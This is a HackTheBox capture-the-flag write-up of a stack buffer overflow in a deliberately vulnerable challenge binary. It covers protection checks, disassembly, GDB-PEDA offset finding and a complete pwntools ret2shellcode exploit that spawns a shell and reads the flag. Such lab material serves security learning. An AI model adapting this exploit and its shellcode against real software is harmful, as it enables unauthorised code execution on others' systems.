CTF: Stack Buffer Overflow Exploit

Full write-up for a HackTheBox Pwn challenge requiring exploitation of a classic stack-based buffer overflow. Covers binary analysis with checksec and GDB-PEDA, offset calculation, return address control, and shellcode injection to achieve remote code execution.

01 — Binary Analysis

The challenge provides a single ELF binary. First step is always to understand what protections are in place before deciding on an attack strategy.

$ file pwn_challenge pwn_challenge: ELF 64-bit LSB executable, x86-64, not stripped $ checksec --binary pwn_challenge [*] Arch: amd64-64-little [*] RELRO: No RELRO [*] Stack: No canary found [*] NX: NX disabled [*] PIE: No PIE
// analysis

No stack canary means we can overwrite the return address. NX disabled means the stack is executable, so we can inject shellcode directly. No PIE means addresses are static — no ASLR bypass needed. Classic ret2shellcode scenario.

02 — Static Analysis

Disassembling the main() function reveals the vulnerable code path:

$ objdump -d pwn_challenge | grep -A 30 "<main>" ; main calls vuln_func() 0x0000000000401156 <+0>: push rbp 0x0000000000401157 <+1>: mov rbp,rsp 0x000000000040115a <+4>: sub rsp,0x40 ; 64 byte buffer allocated 0x000000000040115e <+8>: lea rax,[rbp-0x40] 0x0000000000401162 <+12>: mov rdi,rax 0x0000000000401165 <+15>: call 0x401030 <gets@plt> ; vulnerable! no bounds check

The function uses gets() — the classic vulnerable C function that reads until a newline with no length limit, making it trivially exploitable.

03 — Offset Calculation

Using GDB with the PEDA plugin to find the exact number of bytes needed to reach the saved return address on the stack:

$ gdb -q pwn_challenge gdb-peda$ checksec gdb-peda$ pattern create 200 AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1... gdb-peda$ run Starting program... Enter your name: [paste pattern] Program received signal SIGSEGV gdb-peda$ pattern search Registers contain pattern buffer: RBP+0 found at offset: 64 RIP+0 found at offset: 72
// result

The return address (RIP) is at offset 72. We need 72 bytes of padding, then our 8-byte return address to redirect execution.

04 — Finding a Return Target

Since NX is disabled, we can place shellcode in the buffer and jump to it. We need the stack address where our input lands. With no PIE/ASLR:

gdb-peda$ break *vuln_func gdb-peda$ run gdb-peda$ i r rsp rsp 0x7fffffffde80 0x7fffffffde80 ; buffer starts here — shellcode lands here

05 — Writing the Exploit

Final exploit written with pwntools. Payload structure: shellcode + padding to offset + return address pointing back to start of buffer.

from pwn import * # Setup binary = ELF('./pwn_challenge') p = process('./pwn_challenge') # x86-64 execve("/bin/sh") shellcode shellcode = asm(shellcraft.amd64.linux.sh()) offset = 72 buf_addr = 0x7fffffffde80 # from GDB payload = shellcode payload += b'A' * (offset - len(shellcode)) payload += p64(buf_addr) p.sendlineafter(b'Enter your name: ', payload) p.interactive()

06 — Shell Achieved

$ python3 exploit.py [+] Starting local process './pwn_challenge': pid 12345 [*] Switching to interactive mode $ id uid=1000(user) gid=1000(user) groups=1000(user) $ cat flag.txt HTB{r3t_2_sh3llc0d3_cl4ss1c}

07 — Key Takeaways

  • Always run checksec first — it immediately reveals which bypass techniques are needed
  • Pattern Create/Search in GDB-PEDA makes offset finding trivial compared to manual binary search
  • When NX is off and no ASLR — ret2shellcode is the fastest path to shell
  • pwntools' shellcraft generates correct shellcode for the target arch automatically
  • For hardened binaries (NX on, canary, PIE) — methodology evolves to ret2libc or ROP chains
